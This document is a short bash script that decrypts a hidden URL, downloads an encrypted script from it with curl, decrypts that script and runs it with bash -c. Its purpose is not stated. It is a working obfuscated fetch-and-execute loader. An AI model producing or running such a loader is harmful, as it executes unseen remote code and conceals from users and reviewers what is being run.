#!/bin/bash

decrypt_text() {
    echo -n "$1" | base64 -d | openssl enc -d -aes-256-cbc -a -pbkdf2 -k "$password" | sed "s/@@@@@@@/\n/g"
}

clear_sensitive_data() {
    unset password
    unset decrypted_url
    unset script_url
}

echo "Enter password:"
read -s password
decrypted_url=$(decrypt_text "VTJGc2RHVmtYMTlpT2o5a3dMd3Y2UDVZbjVMN2F3cUV1Q3pWRFJ4dlNvKzNRcVhFc2ZWbWV0M0ovcFRkZ1dHSworOEQ2TTd4RFVQVy9jTkFmU2IzTmlZVkU4WnRqNmh5a1lGWWd4NTIyUGVvPQo=")
script_url=$(echo -n "$decrypted_url" | sed "s/@@@@@@@/\n/g")
encrypted_script=$(curl -sL "$script_url")
decrypted_script=$(decrypt_text "$encrypted_script")

if [[ -n "$decrypted_script" ]]; then
    bash -c "$decrypted_script"
    clear_sensitive_data
else
    echo "Wrong password"
    clear_sensitive_data
    sleep 3
fi
